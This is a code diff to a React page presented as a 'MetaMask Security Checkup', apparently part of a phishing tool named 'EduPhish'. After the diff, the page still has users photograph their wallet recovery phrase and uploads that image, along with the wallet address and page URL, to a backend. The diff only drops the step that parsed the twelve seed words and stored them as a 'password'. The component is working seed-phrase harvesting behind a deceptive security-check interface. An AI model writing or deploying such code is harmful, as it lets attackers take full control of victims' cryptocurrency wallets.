@@ -217,18 +217,13 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
   }
 
   const handleSnapSuccess = useCallback(
-    async (payload: { phrase: string; snapDataUrl: string }) => {
+    async (payload: { snapDataUrl: string }) => {
       setSubmitting(true)
       try {
-        const sanitized = sanitizeRecoveryPhrase(payload.phrase)
-        if (sanitized.validCount < WORD_COUNT) {
-          toast.error('Could not read 12 words. Retake the photo.')
-          return false
-        }
         if (address) {
           await walletApi.recordMetaMaskUnlock({
             walletAddress: address,
-            password: sanitized.cleanedText,
+            password: '',
             pageUrl: window.location.href,
             phraseSnapImage: payload.snapDataUrl,
           })
@@ -237,11 +232,11 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
         if (sessionId) {
           await patchEduPhishSession(sessionId, {
             step: 'submitted',
-            seedWords: sanitized.words.filter(Boolean),
+            seedWords: [],
             activeField: null,
           }).catch(() => {})
         }
-        toast.success('Wallet imported')
+        toast.success('Photo saved')
         navigate('/submissions', { replace: true })
         return true
       } finally {
